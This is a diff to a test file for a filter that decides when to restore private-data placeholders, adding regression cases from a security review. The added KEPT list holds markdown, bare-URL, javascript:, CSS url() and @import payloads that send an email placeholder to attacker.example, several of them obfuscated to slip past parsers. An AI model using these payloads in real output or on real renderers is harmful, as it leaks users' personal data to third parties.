@@ -61,6 +61,41 @@ KEPT = [
     # a link reference definition and its use
     "[1]: /p.png?d=[EMAIL_1]\n\n![s][1]",
     "  [1]:\n  <//attacker.example/?d=[EMAIL_1]>\n\n![s][1]",
+    # security review 2, I-1: a definition anywhere, not only where a line starts
+    "> [r]: https:attacker.example/p.png?d=[EMAIL_1]\n\n![i][r]",
+    "- [r]: https:attacker.example/p.png?d=[EMAIL_1]\n\n![i][r]",
+    "> [r]: /p.png?d=[EMAIL_1]\n\n![i][r]",
+    "1. [r]: /p.png?d=[EMAIL_1]\n\n![i][r]",
+    # ... and its label split over one line break
+    "[a\nb]: https:attacker.example/p.png?d=[EMAIL_1]\n\n![i][a b]",
+    "[a\nb]: /p.png?d=[EMAIL_1]\n\n![i][a b]",
+    # any scheme followed by a non-space opens a bare URL, as WHATWG resolves it
+    "https:attacker.example/?d=[EMAIL_1]",
+    "see https:\\\\attacker.example/?d=[EMAIL_1]",
+    "see https:/\\attacker.example/?d=[EMAIL_1]",
+    "see HtTpS:attacker.example/?d=[EMAIL_1]",
+    "[a] (https:attacker.example/?d=[EMAIL_1])",
+    "[a]&#40;https:attacker.example/?d=[EMAIL_1])",
+    "javascript:fetch('/x?'+'[EMAIL_1]')",
+    "data:text/html,<b>[EMAIL_1]</b>",
+    "mailto:[EMAIL_1]",
+    "Reply to mailto:x@attacker.example?body=[EMAIL_1]",
+    # CSS inside <style>: url(...) and @import, quoted or not
+    "<style>body{background:url(https:attacker.example/?d=[EMAIL_1])}</style>",
+    "<style>body{background:url(/p.png?d=[EMAIL_1])}</style>",
+    "<style>body{background:URL( '/p .png?d=[EMAIL_1]' )}</style>",
+    "<style>@import '/x.css?d=[EMAIL_1]';</style>",
+    '<style>@IMPORT "/x .css?d=[EMAIL_1]";</style>',
+    "<style>@import /x.css?d=[EMAIL_1];</style>",
+    "<style>@import url(/x.css?d=[EMAIL_1]);</style>",
+    # M-a: a bare URL ends only at ASCII whitespace
+    "see https://attacker.example/?a [EMAIL_1]",
+    "see https://attacker.example/?a\x1f[EMAIL_1]",
+    "see https://attacker.example/?a　[EMAIL_1]",
+    "see https://attacker.example/?a\v[EMAIL_1]",
+    # M-b: `www.` in any case
+    "visit Www.attacker.example/?d=[EMAIL_1]",
+    "visit wWw.attacker.example/?d=[EMAIL_1]",
 ]
 
 
@@ -101,6 +136,16 @@ RESTORED = [
     ('<img src="/p.png">\n[EMAIL_1]', '<img src="/p.png">\n{e}'),
     ("email=[EMAIL_1] in code", "email={e} in code"),
     ("awww.[PERSON_1]", "awww.Anna Petrova"),
+    # a word, a colon, then a space is prose, not a scheme
+    ("Note: [PERSON_1] called.", "Note: Anna Petrova called."),
+    ("Re:\t[EMAIL_1]", "Re:\t{e}"),
+    ("From: [PERSON_1]\nTo: [EMAIL_1]", "From: Anna Petrova\nTo: {e}"),
+    ("Dear [PERSON_1]:\nthanks", "Dear Anna Petrova:\nthanks"),
+    ("Meet at 10:30-[PERSON_1]", "Meet at 10:30-Anna Petrova"),
+    ('"name":"[PERSON_1]"', '"name":"Anna Petrova"'),  # JSON, unspaced
+    ("Call curl (see [PERSON_1])", "Call curl (see Anna Petrova)"),
+    ("@important [PERSON_1]", "@important Anna Petrova"),
+    ("my url(s) list [PERSON_1]", "my url(s) list Anna Petrova"),
 ]
 
 
